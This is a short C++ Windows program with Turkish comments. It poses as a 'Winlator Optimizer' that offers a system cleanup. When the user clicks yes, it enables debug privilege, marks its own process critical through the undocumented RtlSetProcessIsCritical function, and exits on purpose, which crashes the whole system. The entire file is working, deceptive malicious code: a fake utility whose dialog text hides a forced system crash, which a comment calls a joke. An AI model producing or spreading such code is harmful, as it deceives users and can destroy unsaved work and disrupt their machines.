#include <windows.h>
#include <iostream>

// Windows'un gizli fonksiyonlarına erişim için gerekli tanımlama
typedef NTSTATUS (NTAPI *pfnRtlSetProcessIsCritical)(
    BOOLEAN bNew, 
    PBOOLEAN pbOld, 
    BOOLEAN bNeedPrivilege);

void SistemiCokert() {
    // 1. Ayrıcalıkları yükselt (Kritik işlem yapabilmek için)
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }

    // 2. ntdll.dll içinden gizli fonksiyonu yükle
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        auto RtlSetProcessIsCritical = (pfnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            // Bu süreci "Kritik Sistem Süreci" olarak işaretle
            RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        }
    }

    // 3. Şimdi programı bilerek kapatıyoruz. 
    // Sistem "Kritik bir işlem kapandı" diyerek çökecektir.
    exit(0); 
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR l, int n) {
    // Kullanıcıya bir şaka/uyarı yapalım
    if (MessageBoxA(NULL, "Sistem temizliği başlatılsın mı?", "Winlator Optimizer", MB_YESNO | MB_ICONQUESTION) == IDYES) {
        SistemiCokert();
    }
    return 0;
}

